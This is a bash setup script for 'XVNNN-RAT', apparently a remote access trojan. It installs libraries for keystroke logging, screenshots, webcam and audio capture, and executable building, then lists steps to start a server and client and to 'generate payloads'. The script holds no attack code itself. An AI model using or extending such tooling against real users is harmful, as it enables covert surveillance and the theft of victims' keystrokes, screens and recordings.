#!/bin/bash
# XVNNN-RAT Setup Script
# Author: Ali Zafar (alizafarbati@gmail.com)

echo "=========================================="
echo "  XVNNN-RAT v1.0.0 - Setup Script"
echo "=========================================="
echo ""

# Check Python
if ! command -v python3 &> /dev/null; then
    echo "❌ Error: Python 3 is required but not installed."
    echo "Please install Python 3.7+ and try again."
    exit 1
fi

# Check Python version
PYTHON_VERSION=$(python3 -c 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")')
if (( $(echo "$PYTHON_VERSION < 3.7" | bc -l) )); then
    echo "❌ Error: Python 3.7+ required, found $PYTHON_VERSION"
    exit 1
fi

echo "✓ Python $PYTHON_VERSION detected"

# Check if running in virtual environment
if [[ -z "$VIRTUAL_ENV" ]]; then
    echo "⚠️  Not in virtual environment (recommended for security)"
    echo "   Create one with: python3 -m venv venv"
    echo "   Activate with: source venv/bin/activate (Linux/macOS)"
else
    echo "✓ Running in virtual environment: $VIRTUAL_ENV"
fi

echo ""
echo "Installing dependencies..."
echo "=========================================="

# Core dependencies
echo "Installing core dependencies..."
pip3 install pynput mss Pillow psutil --break-system-packages
if [ $? -ne 0 ]; then
    echo "⚠️  Core dependencies installation had issues"
    echo "   Some features may not work properly"
fi

# Optional dependencies (recommended)
echo ""
echo "Installing optional dependencies (webcam, audio)..."
pip3 install opencv-python pyaudio --break-system-packages 2>/dev/null || true

echo ""
echo "Installing build tools..."
pip3 install pyinstaller --break-system-packages 2>/dev/null || true

echo ""
echo "=========================================="
echo "✓ Setup complete!"
echo "=========================================="
echo ""
echo "Next steps:"
echo "1. Test installation: python3 test_advanced.py"
echo "2. Start server: python3 src/server/headless.py"
echo "3. Start client: python3 src/client/main.py"
echo "4. Generate payloads: python3 generate.py"
echo ""
echo "For detailed instructions, see README.md"
echo "Author: Ali Zafar (alizafarbati@gmail.com)"
echo ""